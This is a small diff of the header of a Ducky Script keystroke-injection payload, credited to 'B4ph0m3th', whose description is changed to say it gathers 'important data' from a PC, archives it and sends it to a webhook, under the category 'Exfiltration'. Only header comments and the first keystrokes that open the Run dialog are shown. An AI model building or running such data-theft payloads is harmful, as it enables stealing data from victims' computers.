@@ -1,9 +1,9 @@
-REM########################################################################################
+REM###################################################################################################
 REM Author: B4ph0m3th based on UNC0V3R3D's original script (UNC0V3R3D#8662 on Discord)
-REM Description: Extracts Important Data from the PC to a file.
+REM Description: Extracts Important Data from the PC to a file, archive it and sends it to a webhook.
 REM Version:	1.0
 REM Category:	Exfiltration
-REM########################################################################################
+REM###################################################################################################
 DELAY 750
 WINDOWS r
 DELAY 1200
